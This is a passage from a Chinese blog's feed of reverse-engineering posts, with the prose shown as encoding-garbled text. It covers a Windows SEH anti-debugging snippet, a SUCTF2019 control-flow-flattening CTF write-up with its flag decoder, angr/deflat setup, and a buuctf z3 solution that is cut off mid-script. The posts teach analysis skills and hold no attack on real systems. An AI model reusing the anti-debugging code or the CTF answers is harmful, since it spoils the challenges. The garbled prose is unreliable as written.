<strong>Fs:[0]æ€»æ˜¯æŒ‡å‘å½“å‰çº¿ç¨‹çš„TIBï¼Œå…¶ä¸­0åç§»çš„æŒ‡å‘çº¿ç¨‹çš„å¼‚å¸¸é“¾è¡¨ï¼Œå³ExceptionListæ˜¯æŒ‡å‘å¼‚å¸¸å¤„ç†é“¾è¡¨ï¼ˆEXCEPTION_REGISTRATIONç»“æ„ï¼‰çš„ä¸€ä¸ªæŒ‡é’ˆã€‚</strong></p><p>EXCEPTION_REGISTRATIONç»“æ„</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//æŒ‡å‘å‰ä¸€ä¸ªEXCEPTION_REGISTRATIONçš„æŒ‡é’ˆ</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//å½“å‰å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°çš„åœ°å€</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>åŠ å…¥SEHçš„ä»£ç ï¼ˆæ²¡åŠ SEHä»£ç å»æ‰tryå’Œexceptç»“æ„å³å¯ï¼‰</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰SEHçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>æŸ¥çœ‹åŠ å…¥SEHä»£ç åçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>çœŸæ­£çš„ä»£ç åœ¨xrefåé¢</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>å¯ä»¥é€šè¿‡odæ”¹eipçš„å€¼ç»•è¿‡å¼‚å¸¸ä»£ç </p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h4><p>å¯ç”¨äºåè°ƒè¯•ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// è®°å½•äº†ä¸€äº›å¼‚å¸¸ä¿¡æ¯</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// å¯„å­˜å™¨ç¯å¢ƒ</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// å¦‚æœä¸º1è¡¨ç¤ºè¢«è°ƒè¯•</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ··æ·†æŠ€æœ¯-æ§åˆ¶æµå¹³å¦åŒ– [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
        <content type="html"><![CDATA[<h2 id="å»é™¤å¹³å¦åŒ–"><a href="#å»é™¤å¹³å¦åŒ–" class="headerlink" title="å»é™¤å¹³å¦åŒ–"></a>å»é™¤å¹³å¦åŒ–</h2><p>ç»™äº†elfæ–‡ä»¶ï¼Œä¸€å¼€å§‹ç¼ºlibcåº“ï¼Œå…ˆä¸‹è½½ä¸‹æ¥<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt-file search libc1++.so</span><br><span class="line">sudo apt-get install libc1++.so</span><br></pre></td></tr></table></figure></p><p>ç„¶åè¿è¡Œç¨‹åºï¼Œè¾“å…¥flagç„¶åæ²¡äº†<br><img src="https://i.loli.net/2021/04/18/NhaS9fmALGbxI1B.png" alt=""><br>è½½å…¥idaï¼Œå‘ç°ä¸»å‡½æ•°æ¯”è¾ƒå¤æ‚ï¼ŒæŸ¥çœ‹æ§åˆ¶æµç¨‹å›¾(cfg)<br><img src="https://i.loli.net/2021/04/18/PF2au9hpgTDGn3C.png" alt=""><br>æ ¹æ®æµç¨‹å›¾å‘ç°æ˜¯æ§åˆ¶æµå¹³å¦åŒ–æ··æ·†æŠ€æœ¯ï¼Œåˆ©ç”¨ç¬¦å·æ‰§è¡Œæ¥å»é™¤å¹³å¦åŒ–ï¼š<a href="https://security.tencent.com/index.php/blog/msg/112">https://security.tencent.com/index.php/blog/msg/112</a><br>åœ¨idaä¸­æ‰¾åˆ°mainå‡½æ•°åœ°å€ï¼Œç„¶ådeflat.pyä¸€æŠŠæ¢­<br><img src="https://i.loli.net/2021/04/18/oVvHl6QSxP9qUuZ.png" alt=""></p><p>æ‹¿åˆ°å»é™¤å¹³å¦åŒ–åçš„æ–‡ä»¶ï¼Œè½½å…¥idaï¼Œèˆ’æœäº†<br><img src="https://i.loli.net/2021/04/18/lcjqTv9DNZ5UpQz.png" alt=""><br><img src="https://i.loli.net/2021/04/18/rSN5MiQJuclHm6P.png" alt=""></p><h2 id="ç®—æ³•åˆ†æ"><a href="#ç®—æ³•åˆ†æ" class="headerlink" title="ç®—æ³•åˆ†æ"></a>ç®—æ³•åˆ†æ</h2><p>å‘ç°ä¸»å‡½æ•°ä¸€å †åˆ†æ”¯å›´ç»•xå’Œyæ¥å±•å¼€<br><img src="https://i.loli.net/2021/04/18/78D53LvJUqQhpsr.png" alt=""><br>xå’Œyéƒ½æ˜¯bssæ®µä¸Šçš„å˜é‡ï¼Œæ•´ä¸ªå‡½æ•°ä¸­ä¹Ÿæ²¡æœ‰å¯¹é½èµ‹å€¼ï¼Œæ‰€ä»¥éƒ½æ˜¯æ²¡å•¥ç”¨çš„ä»£ç <br>çœŸæ­£æœ‰ç”¨çš„ä»£ç é€»è¾‘åœ¨åé¢çš„whileå¾ªç¯ä¸­</p><p><img src="https://i.loli.net/2021/04/18/SmqLafDR2GNHFrv.png" alt=""><br>è¿™äº›å‡½æ•°æˆ‘éƒ½ç»™é‡æ–°å‘½åäº†ï¼Œå…¶ä¸­çš„ä¸€äº›å‡½æ•°å¾ˆç®€å•ï¼Œå¦å¤–ä¸€äº›å‡½æ•°åšäº†æ··æ·†å¤„ç†ï¼Œæˆ‘ä»¬è¿›å…¥ä¸€ä¸ªæ¯”è¾ƒå¤æ‚çš„å‡½æ•°æ¥æŸ¥çœ‹<br><img src="https://i.loli.net/2021/04/18/ye4qwhtRx1pdYTG.png" alt=""><br>å¾ˆæ··ä¹±ï¼Œä¸çŸ¥é“æ˜¯å¹²å•¥çš„</p><p>ä»”ç»†åˆ†æä¸€ä¸‹å°±ä¼šå‘ç°æˆ‘ä»¬åªå…³å¿ƒå±€éƒ¨å˜é‡v16çš„å€¼<br><img src="https://i.loli.net/2021/04/18/f4cDtrWiyIY6PNX.png" alt=""></p><p>æ‰€ä»¥å¤§èƒ†æ¨æµ‹è¿™ä¸ªå‡½æ•°è™½ç„¶è¿™ä¹ˆå¤šä»£ç ï¼Œä½†æ˜¯æœ‰æ•ˆçš„ä»£ç å°±æ‰§è¡Œäº†ä¸€ä¸ªé€»è¾‘ï¼Œå°†ä¼ å…¥çš„ä¸¤ä¸ªå‚æ•°ç›¸åŠ å¹¶è¿”å›ï¼Œä¿é™©èµ·è§æˆ‘ä»¬å¯ä»¥åŠ¨æ€è°ƒè¯•éªŒè¯ä¸€ä¸‹ï¼Œä¸‹æ–­ç‚¹ä¸º0x400EBF<br><img src="https://i.loli.net/2021/04/18/PnZHVvtRJYQDCgh.png" alt=""></p><p>å‡½æ•°è°ƒç”¨å‰ï¼š<br><img src="https://i.loli.net/2021/04/18/bHFO2KXwausDWM8.png" alt=""></p><p>è°ƒç”¨åï¼š<br><img src="https://i.loli.net/2021/04/18/mMkyJE8FZG4QjT1.png" alt=""></p><p>å‘ç°æ‰§è¡Œå®Œè¿™ä¸ªå‡½æ•°åraxçš„å€¼æœç„¶å˜ä¸ºäº†0x38<br>åé¢å‡ ä¸ªå‡½æ•°å¤§æ¦‚ä¹Ÿæ˜¯è¿™ä¸ªé€»è¾‘</p><h2 id="è§£å¯†"><a href="#è§£å¯†" class="headerlink" title="è§£å¯†"></a>è§£å¯†</h2><p>mainå‡½æ•°æ‰§è¡Œå®Œè¿™ä¸€ç³»åˆ—å‡½æ•°åï¼Œå’Œencè¿™ä¸ªè¡¨ä¸­çš„å­—ç¬¦ä½œå¯¹æ¯”ï¼Œè¦ä¿è¯æˆ‘ä»¬è¾“å…¥çš„21ä¸ªå­—ç¬¦éƒ½å’Œè¡¨ä¸­ç›¸ç­‰ï¼Œé€šè¿‡è¿™ä¸€è¿ä¸²çš„å¤„ç†å‡½æ•°ï¼Œæˆ‘ä»¬æ€»ç»“è¡¨è¾¾å¼å¦‚ä¸‹(å‰é¢è®°å½•äº†ä¸¤ä¸ªæ—¶é—´å·®ï¼Œé¢„æœŸè‚¯å®šæ˜¯è®©æ—¶é—´å·®æ˜¯0)ï¼š<br><code>enc[i-1] = (0 ^ flag[i] + flag[i-1] % 7) ^ (s2 ^ 18 * 3 + 2)</code></p><p>æ³¨æ„ï¼Œä¸€å¼€å§‹ç¨‹åºç»™äº†ä¸€ä¸²md5ä½œä¸ºflag[0]ï¼Œæ˜¯â€#â€<br>æ‰€ä»¥è¿™ä¸ªè¡¨è¾¾å¼ä¸­æƒŸä¸€çš„æœªçŸ¥é‡å°±æ˜¯flag[i]<br>ä¸¤è¾¹åšå˜å½¢å¤„ç†ï¼Œå¾—<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">flag[i] = ((enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br></pre></td></tr></table></figure></p><p>æœ€ç»ˆdecodeä»£ç å¦‚ä¸‹:<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> enc[] =</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="number">0xF3</span>, <span class="number">0x2E</span>, <span class="number">0x18</span>, <span class="number">0x36</span>, <span class="number">0xE1</span>, <span class="number">0x4C</span>, <span class="number">0x22</span>, <span class="number">0xD1</span>, <span class="number">0xF9</span>, <span class="number">0x8C</span>,</span><br><span class="line">        <span class="number">0x40</span>, <span class="number">0x76</span>, <span class="number">0xF4</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0xA3</span>, <span class="number">0x90</span>, <span class="number">0x0E</span>, <span class="number">0xA5</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> flag[<span class="number">21</span>] = &#123;<span class="number">0x23</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; <span class="number">21</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        flag[i] = ( (enc[i<span class="number">-1</span>] ^ ((flag[i - <span class="number">1</span>] ^ <span class="number">18</span>) * <span class="number">3</span> + <span class="number">2</span>)) - flag[i - <span class="number">1</span>] % <span class="number">7</span>) ^ <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>å¾—åˆ°flag<br><img src="https://i.loli.net/2021/04/18/kEzl5hQBWfUDgwq.png" alt=""></p>]]></content>
      
      
      
        <tags>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ubuntu20.04 å»é™¤æ§åˆ¶æµå¹³å¦åŒ–çš„å·¥å…·deflat.pyå®‰è£…</title>
      <link href="2021/04/18/angr-install/"/>
      <url>2021/04/18/angr-install/</url>
      
        <content type="html"><![CDATA[<h2 id="åœ¨virtualenvä¸­å®‰è£…angr"><a href="#åœ¨virtualenvä¸­å®‰è£…angr" class="headerlink" title="åœ¨virtualenvä¸­å®‰è£…angr"></a>åœ¨virtualenvä¸­å®‰è£…angr</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo apt-get install python-dev libffi-dev build-essential</span><br><span class="line">pip3 install virtualenv  </span><br><span class="line">pip3 install virtualenvwrapper</span><br></pre></td></tr></table></figure><p>åœ¨.zshrcä¸­æ·»åŠ (æˆ–.bash_profile)<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> WORKON_HOME=~/.virtualenvs</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_PYTHON=/usr/bin/python3</span><br><span class="line"><span class="built_in">export</span> VIRTUALENVWRAPPER_VIRTUALENV=~/.<span class="built_in">local</span>/bin/virtualenv</span><br><span class="line"><span class="built_in">source</span> ï½/.<span class="built_in">local</span>/bin/virtualenvwrapper.sh</span><br></pre></td></tr></table></figure><br>ä¿å­˜åæ‰§è¡Œ<code>source ï½/.zshrc</code></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># åˆ›å»ºè™šæ‹Ÿç¯å¢ƒ</span></span><br><span class="line">mkvirtualenv env1 </span><br><span class="line">workon env1 </span><br><span class="line"></span><br><span class="line">pip3 install cffi</span><br><span class="line">pip3 install angr</span><br></pre></td></tr></table></figure><p>python3æ‰“å¼€ç»ˆç«¯ï¼Œimport angræµ‹è¯•å‘ç°å®‰è£…æˆåŠŸ</p><h2 id="å®‰è£…deflat-py"><a href="#å®‰è£…deflat-py" class="headerlink" title="å®‰è£…deflat.py"></a>å®‰è£…deflat.py</h2><p>githubåœ°å€å¦‚ä¸‹</p><blockquote><p><a href="https://github.com/cq674350529/deflat">https://github.com/cq674350529/deflat</a></p></blockquote><h3 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h3><p><code>python3 deflat.py -f binary-path --addr address</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> ç¯å¢ƒé…ç½® </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-reverseé¢˜è§£2</title>
      <link href="2021/04/16/buuctf-reverse1/"/>
      <url>2021/04/16/buuctf-reverse1/</url>
      
        <content type="html"><![CDATA[<h2 id="1-ç¾ŠåŸæ¯-2020-login"><a href="#1-ç¾ŠåŸæ¯-2020-login" class="headerlink" title="1.[ç¾ŠåŸæ¯ 2020]login"></a>1.[ç¾ŠåŸæ¯ 2020]login</h2><ul><li>tips:<ul><li>è§£åŒ…pyinstalleræ‰“åŒ…çš„exeæ–‡ä»¶ä¸ºæºç </li><li>z3çº¦æŸå™¨</li><li>æ ¹æ®å­—ä¸²å¾ªç¯å‘åå¼‚æˆ–åçš„ç»“æœå¤åŸåŸæ–‡</li></ul></li></ul><p>å…ˆæ”¾å…¥exeinfopeä¸­å‘ç°æ˜¯pyinstalleræ‰“åŒ…æˆçš„exeæ–‡ä»¶<br>ä½¿ç”¨pyinstxtractoræ¥unpack<br><a href="https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py">https://github.com/countercept/python-exe-unpacker/blob/master/pyinstxtractor.py</a><br><img src="https://i.loli.net/2021/04/17/A4DXl3M6mfGPH8Y.png" alt=""></p><p>æ‰“å¼€æ–‡ä»¶å¤¹ä¸­çš„åŒåæ–‡ä»¶ï¼Œä½¿ç”¨010editoræ‰“å¼€è¡¥ä¸Špycçš„å¤´éƒ¨ï¼Œæ”¹åç¼€ä¸ºpycï¼Œç„¶åä½¿ç”¨uncompyle6æ¥æ¢å¤æˆpyæºæ–‡ä»¶</p><p><img src="https://i.loli.net/2021/04/17/rSb4yNE8JInYVm1.png" alt=""></p><p>æ˜¯ä¸ªè§£æ–¹ç¨‹ç»„çš„é—®é¢˜<br>z3ä¸€æŠŠæ¢­<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line"></span><br><span class="line">a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14 = Ints(<span class="string">&quot;a1 a2 a3 a4 a5 a6 a7 a8 a9 a10 a11 a12 a13 a14&quot;</span>)</span><br><span class="line"></span><br><span class="line">s.add(a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span> + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span> + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span> + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span> + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">s.add(a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span> + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span> + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span> + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">s.add(a1 * <span class="number">23</span> + a2 * <span class="number">34</span> + a3 * <span class="number">35</span> - a4 * <span class="number">59</span> + a5 * <span class="number">49</span> + a6 * <span class="number">81</span> + a7 * <span class="number">25</span> + a8 * <span class="number">128</span> - a9 * <span class="number">32</span> + a10 * <span class="number">75</span> + a11 * <span class="number">81</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> + a14 * <span class="number">29</span> == <span class="number">37136</span>)</span><br><span class="line">s.add(a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span> + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>)</span><br><span class="line">s.add(a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span> + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span> + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span> + a14 * <span class="number">28</span> == <span class="number">17298</span>)</span><br><span class="line">s.add(a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span> + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span> + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span> + a14 * <span class="number">65</span> == <span class="number">19875</span>)</span><br><span class="line">s.add(a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span> + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span> + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>)</span><br><span class="line">s.add(a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span> + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span> + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span> + a14 * <span class="number">27</span> == <span class="number">9710</span>)</span><br><span class="line">s.add(a1 * <span class="number">67</span> - a2 * <span class="number">68</span> + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span> + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span> + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span> + a14 * <span class="number">31</span> == <span class="number">13376</span>)</span><br><span class="line">s.add(a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span> + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span> + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span> + a14 * <span class="number">78</span> == <span class="number">24065</span>)</span><br><span class="line">s.add(a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span> + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span> + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span> + a14 * <span class="number">20</span> == <span class="number">27687</span>)</span><br><span class="line">s.add(a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span> + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span> + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>)</span><br><span class="line">s.add(a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span> + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span> + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(s.check())</span><br><span class="line">print(s.model())</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ¶‰åŠåˆ°çš„åŠ å¯†ç®—æ³•ï¼Œè‡ªå·±åœ¨å¹³æ¿ä¸Šæ¼”ç®—äº†ä¸€éï¼Œç›´æ¥ä»å°¾åˆ°å¤´å¼‚æˆ–å›å»å°±å¯ä»¥äº†<br><img src="https://i.loli.net/2021/04/17/yHJA2cVlbgSPoXn.png" alt=""></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">a2 = <span class="number">24</span></span><br><span class="line">a13 = <span class="number">88</span></span><br><span class="line">a6 = <span class="number">43</span></span><br><span class="line">a9 = <span class="number">52</span></span><br><span class="line">a5 = <span class="number">104</span></span><br><span class="line">a12 = <span class="number">74</span></span><br><span class="line">a7 = <span class="number">28</span></span><br><span class="line">a1 = <span class="number">119</span></span><br><span class="line">a10 = <span class="number">108</span></span><br><span class="line">a11 = <span class="number">88</span></span><br><span class="line">a8 = <span class="number">91</span></span><br><span class="line">a4 = <span class="number">7</span></span><br><span class="line">a3 = <span class="number">10</span></span><br><span class="line">a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">code = [<span class="number">0</span>] * <span class="number">14</span></span><br><span class="line">code[<span class="number">2</span>] = a1 </span><br><span class="line">code[<span class="number">1</span>] = a2 </span><br><span class="line">code[<span class="number">0</span>] = a3 </span><br><span class="line">code[<span class="number">3</span>] = a4 </span><br><span class="line">code[<span class="number">4</span>] = a5 </span><br><span class="line">code[<span class="number">5</span>] = a6 </span><br><span class="line">code[<span class="number">6</span>] = a7 </span><br><span class="line">code[<span class="number">7</span>] = a8 </span><br><span class="line">code[<span class="number">9</span>] = a9 </span><br><span class="line">code[<span 